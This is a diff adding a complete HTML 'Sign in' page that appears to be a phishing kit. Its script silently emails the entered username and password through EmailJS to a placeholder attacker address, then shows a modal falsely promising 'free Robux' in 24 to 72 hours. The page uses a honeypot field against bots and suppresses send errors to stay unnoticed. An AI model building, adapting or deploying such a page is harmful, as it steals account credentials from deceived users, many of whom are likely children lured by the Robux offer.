@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0f0f0e;
+      --surface: #1a1a18;
+      --surface2: #232320;
+      --border: rgba(255,255,255,0.08);
+      --border-focus: rgba(255,255,255,0.22);
+      --text: #f0efe8;
+      --muted: #6b6a64;
+      --accent: #c8f04a;
+      --radius: 10px;
+      --font: 'DM Sans', system-ui, sans-serif;
+      --mono: 'DM Mono', monospace;
+    }
+
+    body {
+      font-family: var(--font);
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+      animation: fadeUp 0.4s ease both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(12px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+      width: 36px; height: 36px;
+      background: var(--accent);
+      border-radius: 8px;
+      margin-bottom: 1.25rem;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    h1 { font-size: 20px; font-weight: 500; color: var(--text); margin-bottom: 1.75rem; }
+
+    .field { margin-bottom: 1rem; }
+    .field label { display: block; font-size: 12px; font-family: var(--mono); color: var(--muted); margin-bottom: 6px; letter-spacing: 0.04em; }
+
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 42px !important; }
+
+    .field input {
+      width: 100%;
+      padding: 10px 13px;
+      font-size: 14px;
+      font-family: var(--font);
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .field input::placeholder { color: var(--muted); }
+    .field input:focus { border-color: var(--border-focus); box-shadow: 0 0 0 3px rgba(255,255,255,0.04); }
+
+    .eye-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      transition: color 0.15s;
+    }
+    .eye-btn:hover { color: var(--text); }
+
+    .hp { position: absolute; left: -9999px; opacity: 0; }
+
+    .submit-btn {
+      width: 100%;
+      padding: 11px;
+      margin-top: 0.5rem;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: var(--font);
+      cursor: pointer;
+      background: var(--accent);
+      color: #0f0f0e;
+      border: none;
+      border-radius: var(--radius);
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .submit-btn:hover { opacity: 0.88; }
+    .submit-btn:active { transform: scale(0.99); }
+
+    /* Modal */
+    .modal-backdrop {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+      padding: 1.5rem;
+    }
+    .modal-backdrop.show { display: flex; }
+
+    .modal {
+      background: #1e1e1c;
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 16px;
+      padding: 2rem;
+      max-width: 320px;
+      width: 100%;
+      text-align: center;
+      animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.85); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-icon {
+      width: 52px; height: 52px;
+      background: rgba(200,240,74,0.12);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 1.25rem;
+    }
+
+    .modal-title { font-size: 17px; font-weight: 500; color: #f0efe8; margin-bottom: 0.6rem; }
+    .modal-sub { font-size: 13px; color: #6b6a64; line-height: 1.6; margin-bottom: 1.5rem; }
+    .modal-sub strong { color: var(--accent); font-weight: 500; }
+
+    .modal-btn {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: var(--font);
+      cursor: pointer;
+      background: var(--accent);
+      color: #0f0f0e;
+      border: none;
+      border-radius: var(--radius);
+      transition: opacity 0.15s;
+    }
+    .modal-btn:hover { opacity: 0.88; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 18 18" fill="none" width="18" height="18">
+      <rect x="3" y="8" width="12" height="8" rx="2" fill="#0f0f0e"/>
+      <path d="M6 8V6a3 3 0 0 1 6 0v2" stroke="#0f0f0e" stroke-width="1.5" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <h1>Sign in</h1>
+
+  <div class="hp" aria-hidden="true">
+    <input type="text" id="hp_field" name="website" autocomplete="off" tabindex="-1"/>
+  </div>
+
+  <div class="field">
+    <label for="uname">username</label>
+    <input type="text" id="uname" placeholder="enter username" autocomplete="username"/>
+  </div>
+
+  <div class="field">
+    <label for="pw">password</label>
+    <div class="pw-wrap">
+      <input type="password" id="pw" placeholder="enter password" autocomplete="current-password"/>
+      <button class="eye-btn" type="button" onclick="togglePw()" aria-label="Toggle password visibility">
+        <svg id="eye-icon" viewBox="0 0 20 20" fill="none" width="18" height="18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z"/>
+          <circle cx="10" cy="10" r="2.5"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <button class="submit-btn" id="submit-btn" onclick="handleSubmit()">Sign in</button>
+</div>
+
+<!-- Modal -->
+<div class="modal-backdrop" id="modal-backdrop">
+  <div class="modal">
+    <div class="modal-icon">
+      <svg viewBox="0 0 22 22" fill="none" width="24" height="24" stroke="#c8f04a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 11l5 5 9-9"/>
+      </svg>
+    </div>
+    <p class="modal-title">Credentials received</p>
+    <p class="modal-sub">Your submission was sent successfully. You will receive free Robux in approximately <strong>24 to 72 hours</strong>.</p>
+    <button class="modal-btn" onclick="closeModal()">Got it</button>
+  </div>
+</div>
+
+<script>
+  const EMAILJS_PUBLIC_KEY  = 'PUBLIC_KEY';
+  const EMAILJS_SERVICE_ID  = 'SERVICE_ID';
+  const EMAILJS_TEMPLATE_ID = 'TEMPLATE_ID';
+  emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
+
+  function togglePw() {
+    const input = document.getElementById('pw');
+    const icon  = document.getElementById('eye-icon');
+    if (input.type === 'password') {
+      input.type = 'text';
+      icon.innerHTML = `
+        <path d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z" stroke="currentColor"/>
+        <circle cx="10" cy="10" r="2.5" stroke="currentColor"/>
+        <line x1="3" y1="17" x2="17" y2="3" stroke="currentColor"/>`;
+    } else {
+      input.type = 'password';
+      icon.innerHTML = `
+        <path d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z" stroke="currentColor"/>
+        <circle cx="10" cy="10" r="2.5" stroke="currentColor"/>`;
+    }
+  }
+
+  async function handleSubmit() {
+    if (document.getElementById('hp_field').value !== '') return;
+
+    const username = document.getElementById('uname').value;
+    const password = document.getElementById('pw').value;
+
+    // Show popup right away — no waiting
+    document.getElementById('modal-backdrop').classList.add('show');
+
+    // Send email silently in background
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+      to_email:  'YOURMAIL@GMAIL.COM',
+      username:  username,
+      password:  password,
+      timestamp: new Date().toLocaleString(),
+    }).catch(() => {});
+  }
+
+  function closeModal() {
+    document.getElementById('modal-backdrop').classList.remove('show');
+    document.getElementById('uname').value = '';
+    document.getElementById('pw').value    = '';
+  }
+
+  document.getElementById('modal-backdrop').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+</script>
+
+</body>
+</html>
